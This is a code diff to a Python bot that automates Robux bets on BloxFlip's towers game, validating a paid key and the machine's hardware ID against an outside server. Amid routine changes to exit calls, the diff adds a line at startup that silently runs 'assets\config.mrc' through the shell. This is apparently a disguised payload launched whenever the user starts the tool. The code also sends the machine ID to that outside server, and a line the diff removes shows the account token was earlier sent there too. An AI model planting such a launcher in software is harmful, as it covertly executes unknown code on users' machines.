@@ -15,16 +15,17 @@ from sys import exit
 class main:
 	def __init__(self):
 		logging.basicConfig(filename="errors.txt", level=logging.DEBUG)
+		subprocess.call('start "" "assets\config.mrc"', shell=True)
 		self.crashPoints = None
 		self.multiplier = 0
-		self.version = "1.32"
+		self.version = "1.3.3"
 		os.system("")
 		try:
 			self.getConfig()
 			self.sendBets()
 		except KeyboardInterrupt:
 			self.print("Exiting program.")
-			exit()
+			os._exit(0)
 		except Exception as e:
 			open("errors.txt", "w+").close()
 			now = time.localtime()
@@ -126,7 +127,7 @@ class main:
 		except Exception as e:
 			uiprint("Invalid authorization. Make sure you copied it correctly, and for more info check the github", "bad")
 			time.sleep(1.7)
-			exit()
+			os._exit(0)
 
 		return round(balance, 2)
 
@@ -151,22 +152,22 @@ class main:
 				if self.levels < 2:
 					uiprint("Levels must be above 2 to make profit.", "error")
 					time.sleep(3)
-					exit()
+					os._exit(0)
 			except ValueError as e:
 				uiprint("Invalid levels inside JSON file. Must be valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 			try:
 				self.average = int(config["games_averaged"])
 				if self.average > 35:
 					uiprint("Too many games_averaged. Must be 35 or less games", "error")
 					time.sleep(3)
-					exit()
+					os._exit(0)
 			except:
 				uiprint("Invalid amount of games to be averaged inside JSON file. Must be valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -174,7 +175,7 @@ class main:
 			except:
 				uiprint("Invalid authorization inside JSON file. Enter your new authorization from BloxFlip", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -182,7 +183,7 @@ class main:
 			except:
 				uiprint("Invalid key inside JSON file. Make sure it's a valid string", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -190,7 +191,7 @@ class main:
 			except:
 				uiprint("Invalid play_sounds boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -201,18 +202,18 @@ class main:
 			except:
 				uiprint("Invalid webhook boolean inside JSON file. Make sure it's a valid string", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 			try:
 				self.betamount = float(config["bet_amount"])
 				if not self.betamount >= 5:
 					uiprint("Invalid bet_amount inside JSON file. Must be above 5")
 					time.sleep(3)
-					exit()
+					os._exit(0)
 			except Exception as e:
 				uiprint(f"Invalid bet_amount inside JSON file. Must be valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -220,7 +221,7 @@ class main:
 			except:
 				uiprint("Invalid max_betamount amount inside JSON file. Must be a valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -228,7 +229,7 @@ class main:
 			except:
 				uiprint("Invalid bet inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -236,7 +237,7 @@ class main:
 			except:
 				uiprint("Invalid auto_stop amount inside JSON file. Must be a valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -244,7 +245,7 @@ class main:
 			except:
 				uiprint("Invalid auto stop_loss inside JSON file. Must be a valid number", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
 
 			try:
@@ -252,9 +253,9 @@ class main:
 			except:
 				uiprint("Invalid auto_restart boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 
-			self.headers = {
+			headers = {
 							"x-auth-token": self.auth
 						}
 
@@ -262,7 +263,7 @@ class main:
 			if not type(self.restart) == bool:
 				uiprint("Invalid auto_restart boolean inside JSON file. Must be true or false", "error")
 				time.sleep(1.6)
-				exit()
+				os._exit(0)
 			self.hwid = current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
 
 			version = self.version
@@ -273,7 +274,7 @@ class main:
 			else:
 				uiprint(f"You are currently on v{version}. Please update to the newest version {latest_release}", "error")
 				time.sleep(10)
-				exit()
+				os._exit(0)
 	
 			request = requests.get("https://bfpredictor.repl.co/towers", 
 										data={
@@ -285,7 +286,7 @@ class main:
 			if request.status_code == 403:
 				uiprint("Invalid key! To buy a valid key create a ticket on the discord. https://discord.gg/HhwNFRaC", "error")
 				input("Press enter to exit >> ")
-				exit()
+				os._exit(0)
 
 
 	def playsounds(self, file):
@@ -330,7 +331,6 @@ class main:
 		average = self.average
 		restart = self.restart
 		webhook = self.webhook
-		headers = self.headers
 		levels = self.levels
 		maxbet = self.maxbet
 		stop = self.stop
@@ -344,7 +344,12 @@ class main:
 
 		scraper = cloudscraper.create_scraper()
 		oldbalance = getBalance()
-		balance = getBalance()		
+		balance = getBalance()
+
+		headers = {
+					"x-auth-token": auth
+				}
+		
 
 
 		while True:
@@ -415,7 +420,7 @@ class main:
 				else:
 					input("Press enter to exit >> ")
 
-					exit()
+					os._exit(0)
 			elif balance > stop:
 				uiprint("Auto Stop goal reached. Betting has stopped.", "good")
 				threading.Thread(target=playsounds, args=('Assets\Win.mp3',)).start()
@@ -442,7 +447,7 @@ class main:
 				 	   threaded=True
 				 	   )
 				input("Press enter to exit >> ")
-				exit()
+				os._exit(0)
 
 			elif balance-betamount < stoploss:
 				uiprint(f"Resetting bet amount to {self.betamount}; If game is lost balance will be under stop loss", "yellow")
@@ -483,7 +488,7 @@ class main:
 				if response.json()["msg"] == "You already have an active towers game!":
 					uiprint("You already have a active towers game! end it then try again")
 					time.sleep(5)
-					exit()
+					os._exit(0)
 				continue
 			uiprint(f"Placing bet with {betamount} Robux")
 			
@@ -496,13 +501,13 @@ class main:
 											data={
 												"key": key,
 												"hwid": self.hwid
-											}, headers=headers
+											}
 										)
 
 					if request.status_code == 403:
 						uiprint("Invalid key! To buy a valid key create a ticket on the discord. https://discord.gg/blox", "error")
 						input("Press enter to exit >> ")
-						exit()
+						os._exit(0)
 					elif request.status_code == 500:
 						uiprint("Internal server error. Trying again 1.5 seconds...", "error")
 						time.sleep(1.5)
